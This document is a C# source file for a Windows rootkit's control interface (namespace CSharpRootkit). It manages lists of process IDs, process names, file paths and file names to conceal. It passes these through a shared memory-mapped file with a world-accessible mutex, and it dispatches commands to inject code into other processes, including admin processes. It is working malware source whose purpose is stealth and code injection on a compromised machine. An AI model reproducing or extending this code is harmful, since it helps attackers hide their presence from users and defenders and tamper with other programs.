using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CSharpRootkit
{
    public static class RootKitInterface
    {
        public static bool started = false;

        private static string RootKitMemFileName;

        private static MemoryMappedFile MemoryFile;
        private static MemoryMappedViewAccessor MemoryFileModifier;

        private static Thread UpdaterThread;

        private static bool NeedsUpdate = true;

        private static List<int> HidePids = new List<int>();
        private static List<string> HideProcessNames = new List<string>();
        private static List<string> HideFilePaths = new List<string>();
        private static List<string> HideFileNames = new List<string>();
        private static List<string> InjectProcessNameInclusionExclusionList = new List<string>();
        private static List<string> InjectProcessPathInclusionExclusionList = new List<string>();

        private static long OneMb = 1 * 1024 * 1024; // 1mb

        private static long MemoryMappedFileSize = OneMb * 5; // 5mb

        private static long ControllerKeyRegionStart = 0;
        private static long ControllerKeyRegionEnd = ControllerKeyRegionStart+sizeof(int);

        private static long RootKitStartedRegionStart = ControllerKeyRegionEnd;
        private static long RootKitStartedRegionEnd = RootKitStartedRegionStart + sizeof(bool);

        private static long IsInclusionModeRegionStart = RootKitStartedRegionEnd;
        private static long IsInclusionModeRegionEnd = IsInclusionModeRegionStart + sizeof(bool);

        private static long HideInfoRegionStart = IsInclusionModeRegionEnd;
        private static long HideInfoRegionEnd = HideInfoRegionStart + OneMb;//+1mb

        private static long InclusionExclusionInfoRegionStart = HideInfoRegionEnd;
        private static long InclusionExclusionInfoRegionEnd = InclusionExclusionInfoRegionStart + OneMb;//+1mb

        private static long ServerCommandsRegionStart = InclusionExclusionInfoRegionEnd;
        private static long ServerCommandsRegionEnd = ServerCommandsRegionStart + OneMb;//+1mb

        private static long ClientCommandsRegionStart = ServerCommandsRegionEnd;
        private static long ClientCommandsRegionEnd = ClientCommandsRegionStart + OneMb;//+1mb

        private static string ServerCommandRegionMutex;
        private static string ClientCommandRegionMutex;

        private static bool InheritExistingHideData;

        private static MutexSecurity MutexSecuritySettings;

        private static int InterfaceKey;

        static RootKitInterface() 
        {
            MutexSecuritySettings = new MutexSecurity();
            
            // Allow everyone to use the mutex
            MutexAccessRule securityRule =new MutexAccessRule(
                new SecurityIdentifier(WellKnownSidType.WorldSid, null),
                MutexRights.FullControl,
                AccessControlType.Allow);

            MutexSecuritySettings.AddAccessRule(securityRule);

            InterfaceKey = Utils.RandomInt();

        }

        public static void Start(bool InheritExistingHideDataSettings = false, string MemFileName = "RootKitMemFile") 
        {
            if (started)
            {
                throw new Exception("The interface is already started!");
            }
            InheritExistingHideData = InheritExistingHideDataSettings;
            RootKitMemFileName = MemFileName;
            ServerCommandRegionMutex = RootKitMemFileName + "ServerCommandRegion";
            ClientCommandRegionMutex = RootKitMemFileName + "ClientCommandRegion";
            MemoryFile = MemoryMappedFile.CreateOrOpen(RootKitMemFileName, MemoryMappedFileSize, MemoryMappedFileAccess.ReadWrite, MemoryMappedFileOptions.None, HandleInheritability.Inheritable);
            MemoryFileModifier = MemoryFile.CreateViewAccessor();
            UpdaterThread = new Thread(StartUpdaterErrorCatch);
            UpdaterThread.Start();
            SignalRootKitStart();
            started = true;
            
        }

        public static void Stop() 
        {
            if (!started) 
            {
                throw new Exception("This interface has not been started!");
            }

            InteralStop(true);
            //try
            //{
            //    UpdaterThread.Abort();
            //}
            //catch { }

            //make it keep count of all the memory regions its allocated and clear them too.


        }

        private static void InteralStop(bool signalRootKitStop = true) 
        {
            if (signalRootKitStop) 
            {
                SignalRootKitStop();
            }
            
            HidePids.Clear();
            HideProcessNames.Clear();
            HideFilePaths.Clear();
            HideFileNames.Clear();
            MemoryFileModifier?.Dispose();
            MemoryFile?.Dispose();
            NeedsUpdate = true;
            started = false;
        }

        private static byte[] ConvertHideData() 
        {
            int[] pids = HidePids.ToArray();
            string[] processNames = HideProcessNames.ToArray();
            string[] filePaths = HideFilePaths.ToArray();
            string[] fileNames = HideFileNames.ToArray();

            int totalSize = 0;

            // Size for pids
            totalSize += 4 + (pids.Length * 4); // 4 bytes for length and 4 bytes for each pid

            // Size for processNames
            totalSize += 4; // 4 bytes for the number of process names
            foreach (string name in processNames)
            {
                totalSize += 4 + (name.Length * 2); // 4 bytes for length and 2 bytes per character
            }

            // Size for filePaths
            totalSize += 4; // 4 bytes for the number of file paths
            foreach (string path in filePaths)
            {
                totalSize += 4 + (path.Length * 2); // 4 bytes for length and 2 bytes per character
            }

            // Size for fileNames
            totalSize += 4; // 4 bytes for the number of file names
            foreach (string name in fileNames)
            {
                totalSize += 4 + (name.Length * 2); // 4 bytes for length and 2 bytes per character
            }

            // Create the byte array
            byte[] result = new byte[totalSize];
            int offset = 0;

            // Add pids to the byte array
            Buffer.BlockCopy(BitConverter.GetBytes(pids.Length), 0, result, offset, 4);
            offset += 4;
            foreach (int pid in pids)
            {
                Buffer.BlockCopy(BitConverter.GetBytes(pid), 0, result, offset, 4);
                offset += 4;
            }

            // Add processNames to the byte array
            Buffer.BlockCopy(BitConverter.GetBytes(processNames.Length), 0, result, offset, 4);
            offset += 4;
            foreach (string name in processNames)
            {
                byte[] nameBytes = Encoding.Unicode.GetBytes(name);
                Buffer.BlockCopy(BitConverter.GetBytes(nameBytes.Length), 0, result, offset, 4);
                offset += 4;
                Buffer.BlockCopy(nameBytes, 0, result, offset, nameBytes.Length);
                offset += nameBytes.Length;
            }

            // Add filePaths to the byte array
            Buffer.BlockCopy(BitConverter.GetBytes(filePaths.Length), 0, result, offset, 4);
            offset += 4;
            foreach (string path in filePaths)
            {
                byte[] pathBytes = Encoding.Unicode.GetBytes(path);
                Buffer.BlockCopy(BitConverter.GetBytes(pathBytes.Length), 0, result, offset, 4);
                offset += 4;
                Buffer.BlockCopy(pathBytes, 0, result, offset, pathBytes.Length);
                offset += pathBytes.Length;
            }

            // Add fileNames to the byte array
            Buffer.BlockCopy(BitConverter.GetBytes(fileNames.Length), 0, result, offset, 4);
            offset += 4;
            foreach (string name in fileNames)
            {
                byte[] nameBytes = Encoding.Unicode.GetBytes(name);
                Buffer.BlockCopy(BitConverter.GetBytes(nameBytes.Length), 0, result, offset, 4);
                offset += 4;
                Buffer.BlockCopy(nameBytes, 0, result, offset, nameBytes.Length);
                offset += nameBytes.Length;
            }

            return result;

        }

        private static byte[] ConvertInclusionExclusionData() 
        {
            string[] processNames = InjectProcessNameInclusionExclusionList.ToArray();
            string[] processPaths = InjectProcessPathInclusionExclusionList.ToArray();

            int totalSize = 0;

            // Size for fileNames
            totalSize += 4; // 4 bytes for the number of file names
            foreach (string name in processNames)
            {
                totalSize += 4 + (name.Length * 2); // 4 bytes for length and 2 bytes per character
            }

            // Size for filePaths
            totalSize += 4; // 4 bytes for the number of file paths
            foreach (string path in processPaths)
            {
                totalSize += 4 + (path.Length * 2); // 4 bytes for length and 2 bytes per character
            }

            byte[] result = new byte[totalSize];
            int offset = 0;

            Buffer.BlockCopy(BitConverter.GetBytes(processNames.Length), 0, result, offset, 4);
            offset += 4;
            foreach (string name in processNames)
            {
                byte[] nameBytes = Encoding.Unicode.GetBytes(name);
                Buffer.BlockCopy(BitConverter.GetBytes(nameBytes.Length), 0, result, offset, 4);
                offset += 4;
                Buffer.BlockCopy(nameBytes, 0, result, offset, nameBytes.Length);
                offset += nameBytes.Length;
            }

            // Add filePaths to the byte array
            Buffer.BlockCopy(BitConverter.GetBytes(processPaths.Length), 0, result, offset, 4);
            offset += 4;
            foreach (string path in processPaths)
            {
                byte[] pathBytes = Encoding.Unicode.GetBytes(path);
                Buffer.BlockCopy(BitConverter.GetBytes(pathBytes.Length), 0, result, offset, 4);
                offset += 4;
                Buffer.BlockCopy(pathBytes, 0, result, offset, pathBytes.Length);
                offset += pathBytes.Length;
            }

            return result;

        }

        private static void StartUpdaterErrorCatch()
        {
            Thread.Sleep(1000);
            try 
            {
                StartUpdater();
            } 
            catch 
            {
                InteralStop(false);
            }
        }

        private static void StartUpdater() 
        {
            SetInterfaceKey(InterfaceKey);
            if (InheritExistingHideData)
            {
                byte[] HiddenDataBuffer = new byte[HideInfoRegionEnd - HideInfoRegionStart];
                MemoryFileModifier.ReadArray(HideInfoRegionStart, HiddenDataBuffer, 0, HiddenDataBuffer.Length);
                GetHiddenData(HiddenDataBuffer, out int[] pids, out string[] processNames, out string[] filePaths, out string[] fileNames);
                HidePids = pids.ToList();
                HideProcessNames = processNames.ToList();
                HideFilePaths = filePaths.ToList();
                HideFileNames = fileNames.ToList();
            }
            while (started) 
            {
                if (GetInterfaceKey() != InterfaceKey) 
                {
                    //another interface has taken control.
                    InteralStop(false);
                    break;//maybe error instead of break, gonna figure that out.
                }
                if (NeedsUpdate) 
                {
                    byte[] HideData = ConvertHideData();
                    byte[] InclusionExclusionData = ConvertInclusionExclusionData();
                    NeedsUpdate = false;

                    if (HideData.Length >= (HideInfoRegionEnd - HideInfoRegionStart)) 
                    { 
                        //an error needs to occur, something needs to happen here.
                    }

                    if (InclusionExclusionData.Length >= (InclusionExclusionInfoRegionEnd - InclusionExclusionInfoRegionStart))
                    {
                        //an error needs to occur, something needs to happen here.
                    }

                    try
                    {
                        MemoryFileModifier.WriteArray(HideInfoRegionStart, HideData, 0, HideData.Length);
                    }
                    catch 
                    {
                        break;
                    }

                    try
                    {
                        MemoryFileModifier.WriteArray(InclusionExclusionInfoRegionStart, InclusionExclusionData, 0, InclusionExclusionData.Length);
                    }
                    catch
                    {
                        break;
                    }
                }

                foreach (RootKitIPCStructs.ClientCommand command in GetCommands()) 
                {
                    if (command.opcode == RootKitIPCStructs.ServerOpcodeEnum.MimicNtResumeInjectOnAdminProcess) 
                    {
                        if (!IsTaskCompleted<RootKitIPCStructs.InjectProcessInfo>(command.location)) 
                        {
                            RootKitIPCStructs.InjectProcessInfo structData = Utils.BytesToStruct<RootKitIPCStructs.InjectProcessInfo>(command.data);
                            if (!IsAgainstInclusionExclusionRules(structData.ProcessToInject) && Utils.ShouldInject(structData.ProcessToInject))
                            {
                                RootKit.MimicNtResumeThreadInject(structData.ProcessToInject);
                            }
                            else 
                            {
                                //pass it off to another process.
                            }

                            MarkTaskComplete<RootKitIPCStructs.InjectProcessInfo>(command.location);
                        }
                    }
                }

                Thread.Sleep(50);
            }
        }

        private static bool IsTaskCompleted<T>(RootKitIPCStructs.MemoryInfoTag taskLocation) 
        {
            long CompletionBoolLocation = taskLocation.StartRegion + 4 + 1 + (int)Marshal.OffsetOf<T>("TaskComplete");//+4 for the length header, +1 for the opcode, +x to offset us to the direct address
            return MemoryFileModifier.ReadBoolean(CompletionBoolLocation);
        }

        private static void MarkTaskComplete<T>(RootKitIPCStructs.MemoryInfoTag taskLocation) 
        {
            long CompletionBoolLocation = taskLocation.StartRegion + 4 + 1 + (int)Marshal.OffsetOf<T>("TaskComplete");//+4 for the length header, +1 for the opcode, +x to offset us to the direct address
            MemoryFileModifier.Write(CompletionBoolLocation, true);
        }

        private static bool WaitForTaskComplete<T>(RootKitIPCStructs.MemoryInfoTag taskLocation, int timeout = 2000)
        {
            long CompletionBoolLocation = taskLocation.StartRegion + 4 + 1 + (int)Marshal.OffsetOf<T>("TaskComplete");//+4 for the length header, +1 for the opcode, +x to offset us to the direct address
            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();
            while (stopwatch.ElapsedMilliseconds < timeout)
            {
                if (MemoryFileModifier.ReadBoolean(CompletionBoolLocation))
                {
                    return true;
                }
                Thread.Sleep(50);
            }
            return false;
        }

        private static RootKitIPCStructs.ClientCommand[] GetCommands() 
        {
            List<RootKitIPCStructs.ClientCommand> commands = new List<RootKitIPCStructs.ClientCommand>();
            long currentPos = ClientCommandsRegionStart;
            while (currentPos < ClientCommandsRegionEnd)
            {
                int structLength = MemoryFileModifier.ReadInt32(currentPos);

                if (structLength == 0)
                {
                    long tempPos = currentPos;
                    while (tempPos < ClientCommandsRegionEnd)
                    {
                        if (MemoryFileModifier.ReadByte(tempPos) != 0)
                        {
                            currentPos = tempPos;
                            structLength = MemoryFileModifier.ReadInt32(currentPos);
                            currentPos += 4;
                            break;
                        }
                        tempPos++;
                    }
                    if (tempPos >= ClientCommandsRegionEnd)
                    {
                        return commands.ToArray();
                    }
                }
                else 
                {
                    currentPos += 4;
                }

                RootKitIPCStructs.MemoryInfoTag location=new RootKitIPCStructs.MemoryInfoTag() { StartRegion = currentPos - 4, EndRegion = currentPos + structLength };//-4 to account the +4 earlier, we only add in the EndRegion as the memoryinfo holds the length header too, so currentPos is currently skipping the header + oncoming struct length

                RootKitIPCStructs.ServerOpcodeEnum opcode = (RootKitIPCStructs.ServerOpcodeEnum)MemoryFileModifier.ReadByte(currentPos);
                currentPos++;
                structLength--;
                byte[] data = new byte[structLength];
                MemoryFileModifier.ReadArray(currentPos, data, 0, data.Length);
                commands.Add(new RootKitIPCStructs.ClientCommand() { opcode = opcode, data = data, location = location });
                currentPos += structLength;
            }
            return commands.ToArray();
        }

        private static RootKitIPCStructs.MemoryInfoTag GetNextAddAvailbleDataSpot(int dataLength)
        {
            long currentPos = ServerCommandsRegionStart;
            while (currentPos < ServerCommandsRegionEnd)
            {
                int structLength = MemoryFileModifier.ReadInt32(currentPos);
                if (structLength == 0) // Free region, need to find the next region and make sure it doesn't overwrite
                {
                    long tempCurrentPos = currentPos;

                    while (tempCurrentPos < ClientCommandsRegionEnd && (tempCurrentPos - currentPos) < dataLength)
                    {
                        if (MemoryFileModifier.ReadByte(tempCurrentPos) != 0)
                        {
                            break;
                        }
                        tempCurrentPos++;
                    }
                    long RegionSize = tempCurrentPos - currentPos;
                    if (dataLength <= RegionSize)
                    {
                        return new RootKitIPCStructs.MemoryInfoTag { StartRegion = currentPos, EndRegion = currentPos + dataLength, HasRegion = true };
                    }
                    else
                    {
                        currentPos = tempCurrentPos;

                        if (currentPos >= ServerCommandsRegionEnd)
                        {
                            break;
                        }

                        structLength = MemoryFileModifier.ReadInt32(currentPos);
                    }
                }
                currentPos += structLength + 4; // +4 for the starting int
            }
            return new RootKitIPCStructs.MemoryInfoTag { StartRegion = 0, EndRegion = 0, HasRegion = false };
        }

        private static RootKitIPCStructs.MemoryInfoTag AddServerRegionCommandData<T>(RootKitIPCStructs.ClientOpcodeEnum opcode, T data) 
        {
            using (Mutex mutex = new Mutex(false, ServerCommandRegionMutex, out bool createdNew, MutexSecuritySettings)) 
            {
                try
                {
                    mutex.WaitOne();
                    byte[] TData = Utils.StructToBytes(data);
                    int payloadLength = TData.Length + 1;//+1 for the opcode which should be 1 byte
                    byte[] payloadData = Utils.CombineByteArrays(BitConverter.GetBytes(payloadLength), new byte[] { (byte)opcode }, TData);
                    RootKitIPCStructs.MemoryInfoTag result = GetNextAddAvailbleDataSpot(payloadData.Length);
                    if (result.HasRegion)
                    {
                        MemoryFileModifier.WriteArray(result.StartRegion, payloadData, 0, payloadData.Length);
                    }
                    return result;
                }
                finally 
                {
                    mutex.ReleaseMutex();
                }
            }
        }

        private static void GetHiddenData(byte[] data, out int[] pids, out string[] processNames, out string[] filePaths, out string[] fileNames)
        {
            int offset = 0;

            // Deserialize pids
            int pidsLength = BitConverter.ToInt32(data, offset);
            offset += 4;
            pids = new int[pidsLength];
            for (int i = 0; i < pidsLength; i++)
            {
                pids[i] = BitConverter.ToInt32(data, offset);
                offset += 4;
            }

            // Deserialize processNames
            int processNamesLength = BitConverter.ToInt32(data, offset);
            offset += 4;
            processNames = new string[processNamesLength];
            for (int i = 0; i < processNamesLength; i++)
            {
                int nameLength = BitConverter.ToInt32(data, offset);
                offset += 4;
                processNames[i] = Encoding.Unicode.GetString(data, offset, nameLength);
                offset += nameLength;
            }

            // Deserialize filePaths
            int filePathsLength = BitConverter.ToInt32(data, offset);
            offset += 4;
            filePaths = new string[filePathsLength];
            for (int i = 0; i < filePathsLength; i++)
            {
                int pathLength = BitConverter.ToInt32(data, offset);
                offset += 4;
                filePaths[i] = Encoding.Unicode.GetString(data, offset, pathLength);
                offset += pathLength;
            }

            // Deserialize fileNames
            int fileNamesLength = BitConverter.ToInt32(data, offset);
            offset += 4;
            fileNames = new string[fileNamesLength];
            for (int i = 0; i < fileNamesLength; i++)
            {
                int nameLength = BitConverter.ToInt32(data, offset);
                offset += 4;
                fileNames[i] = Encoding.Unicode.GetString(data, offset, nameLength);
                offset += nameLength;
            }
        }

        private static void GetInclusionExclusionData(byte[] data, out string[] ProcessNames, out string[] FilePaths)
        {
            int offset = 0;
            int processNamesLength = BitConverter.ToInt32(data, offset);
            offset += 4;
            ProcessNames = new string[processNamesLength];

            for (int i = 0; i < processNamesLength; i++)
            {
                int nameLength = BitConverter.ToInt32(data, offset);
                offset += 4;
                ProcessNames[i] = Encoding.Unicode.GetString(data, offset, nameLength);
                offset += nameLength;
            }

            int filePathsLength = BitConverter.ToInt32(data, offset);
            offset += 4;
            FilePaths = new string[filePathsLength];
            for (int i = 0; i < filePathsLength; i++)
            {
                int pathLength = BitConverter.ToInt32(data, offset);
                offset += 4;
                FilePaths[i] = Encoding.Unicode.GetString(data, offset, pathLength);
                offset += pathLength;
            }
        }


        private static void RemoveRegionCommandData(RootKitIPCStructs.MemoryInfoTag region) 
        {
            byte[] NullData = new byte[region.EndRegion - region.StartRegion];
            MemoryFileModifier.WriteArray(region.StartRegion, NullData, 0, NullData.Length);
        }

        private static int GetInterfaceKey() 
        {
            return MemoryFileModifier.ReadInt32(ControllerKeyRegionStart);
        }
        private static void SetInterfaceKey(int key)
        {
            MemoryFileModifier.Write(ControllerKeyRegionStart, key);
        }

        private static void SignalRootKitStart() 
        {
            MemoryFileModifier.Write(RootKitStartedRegionStart, true);
        }

        private static void SignalRootKitStop()
        {
            MemoryFileModifier.Write(RootKitStartedRegionStart, false);
        }

        private static bool GetRootKitStatus()
        {
            return MemoryFileModifier.ReadBoolean(RootKitStartedRegionStart);
        }

        private static bool IsInclusionMode() 
        {
            return MemoryFileModifier.ReadBoolean(IsInclusionModeRegionStart);
        }


        public static int[] GetHiddenPids()
        {
            return HidePids.ToArray();
        }

        public static void ClearHiddenPids()
        {
            HidePids.Clear();
            NeedsUpdate = true;
        }

        public static void HidePid(int pid)
        {
            if (pid == 0)
            {
                throw new Exception("Cant hide System!");
            }
            HidePids.Add(pid);
            NeedsUpdate = true;
        }

        public static void UnHidePid(int pid)
        {
            HidePids.Remove(pid);
            NeedsUpdate = true;
        }

        public static string[] GetHiddenProcessNames()
        {
            return HideProcessNames.ToArray();
        }

        public static void ClearHiddenProcessNames()
        {
            HideProcessNames.Clear();
            NeedsUpdate = true;
        }

        public static void HideProcessName(string procName)
        {
            HideProcessNames.Add(procName.ToLower());
            NeedsUpdate = true;
        }

        public static void UnHideProcessName(string procName)
        {
            HideProcessNames.Remove(procName.ToLower());
            NeedsUpdate = true;
        }

        public static string[] GetHiddenFilePaths()
        {
            return HideFilePaths.ToArray();
        }

        public static void ClearHiddenFilePaths()
        {
            HideFilePaths.Clear();
            NeedsUpdate = true;
        }

        public static void HideFilePath(string filePath)
        {
            if (filePath.Replace(".", "").Replace("\\", "") == "")
            {
                throw new Exception("You cant supply that as a FilePath!");
            }
            if (filePath.StartsWith("\\\\?\\"))
            {
                filePath = filePath.Substring(4);
            }
            HideFilePaths.Add(filePath.ToLower());
            NeedsUpdate = true;
        }

        public static void UnHideFilePath(string filePath)
        {
            if (filePath.StartsWith("\\\\?\\"))
            {
                filePath = filePath.Substring(4);
            }
            HideFilePaths.Remove(filePath.ToLower());
            NeedsUpdate = true;
        }

        public static string[] GetHiddenFileNames()
        {
            return HideFileNames.ToArray();
        }

        public static void ClearHiddenFileNames()
        {
            HideFileNames.Clear();
            NeedsUpdate = true;
        }

        public static void HideFileName(string fileName)
        {
            if (fileName.Replace(".", "").Replace("\\", "") == "")
            {
                throw new Exception("You cant supply that as a FilePath!");
            }
            HideFileNames.Add(fileName.ToLower());
            NeedsUpdate = true;
        }

        public static void UnHideFileName(string fileName)
        {
            HideFileNames.Remove(fileName.ToLower());
            NeedsUpdate = true;
        }

        public static void ClearAllHiddenData()
        {
            HidePids.Clear();
            HideProcessNames.Clear();
            HideFileNames.Clear();
            HideFilePaths.Clear();
            NeedsUpdate = true;
        }

        public static void SetInclusionMode()
        {
            if (!started)
            {
                throw new Exception("This interface has not been started!");
            }
            MemoryFileModifier.Write(IsInclusionModeRegionStart, true);
        }

        public static void SetExclusionMode()
        {
            if (!started)
            {
                throw new Exception("This interface has not been started!");
            }
            MemoryFileModifier.Write(IsInclusionModeRegionStart, false);
        }

        public static void AddInclusionExclusionProcessName(string procName) 
        {
            InjectProcessNameInclusionExclusionList.Add(procName.ToLower());
            NeedsUpdate = true;
        }

        public static string[] GetInclusionExclusionProcessNames() 
        {
            return InjectProcessNameInclusionExclusionList.ToArray();
        }

        public static void RemoveInclusionExclusionProcessNames(string procName) 
        {
            InjectProcessNameInclusionExclusionList.Remove(procName.ToLower());
            NeedsUpdate = true;
        }

        public static void ClearInclusionExclusionProcessNames() 
        {
            InjectProcessNameInclusionExclusionList.Clear();
            NeedsUpdate = true;
        }

        public static void AddInclusionExclusionFilePath(string filePath)
        {
            InjectProcessPathInclusionExclusionList.Add(filePath.ToLower());
            NeedsUpdate = true;
        }

        public static string[] GetInclusionExclusionFilePath()
        {
            return InjectProcessPathInclusionExclusionList.ToArray();
        }

        public static void RemoveInclusionExclusionFilePaths(string filePath)
        {
            InjectProcessPathInclusionExclusionList.Remove(filePath.ToLower());
            NeedsUpdate = true;
        }

        public static void ClearInclusionExclusionFilePath()
        {
            InjectProcessPathInclusionExclusionList.Clear();
            NeedsUpdate = true;
        }

        public static void ClearAllInclusionExclusionData()
        {
            InjectProcessPathInclusionExclusionList.Clear();
            InjectProcessNameInclusionExclusionList.Clear();
            NeedsUpdate = true;
        }

        public static bool IsAgainstInclusionExclusionRules(int pid) 
        {
            if (!started)
            {
                throw new Exception("This interface has not been started!");
            }


            bool isInclusion = IsInclusionMode();

            if (Utils.GetFilePathOfProcess(pid, out string fullFilePath))
            {
                string processName = Path.GetFileName(fullFilePath).ToLower();
                string[] InclusionExclusionPathNamesCopy = InjectProcessPathInclusionExclusionList.ToArray();
                string[] InclusionExclusionProcessNamesCopy = InjectProcessNameInclusionExclusionList.ToArray();

                foreach (string path in InclusionExclusionPathNamesCopy)
                {
                    if (Utils.ComparePaths(path, fullFilePath))
                    {
                        return !isInclusion;
                    }
                }

                foreach (string name in InjectProcessNameInclusionExclusionList)
                {
                    if (processName == name)
                    {
                        return !isInclusion;
                    }
                }

            }

            return isInclusion;


        }

        public static bool IsAgainstInclusionExclusionRules(IntPtr hProcess) 
        {
            if (!started)
            {
                throw new Exception("This interface has not been started!");
            }

            bool isInclusion = IsInclusionMode();

            if (Utils.GetFilePathOfProcess(hProcess, out string fullFilePath))
            {
                string processName = Path.GetFileName(fullFilePath).ToLower();
                string[] InclusionExclusionPathNamesCopy = InjectProcessPathInclusionExclusionList.ToArray();
                string[] InclusionExclusionProcessNamesCopy = InjectProcessNameInclusionExclusionList.ToArray();

                foreach (string path in InclusionExclusionPathNamesCopy) 
                {
                    if (Utils.ComparePaths(path, fullFilePath)) 
                    {
                        return !isInclusion;
                    }
                }

                foreach (string name in InjectProcessNameInclusionExclusionList)
                {
                    if (processName == name)
                    {
                        return !isInclusion;
                    }
                }

            }

            return isInclusion;
        }


    }
}
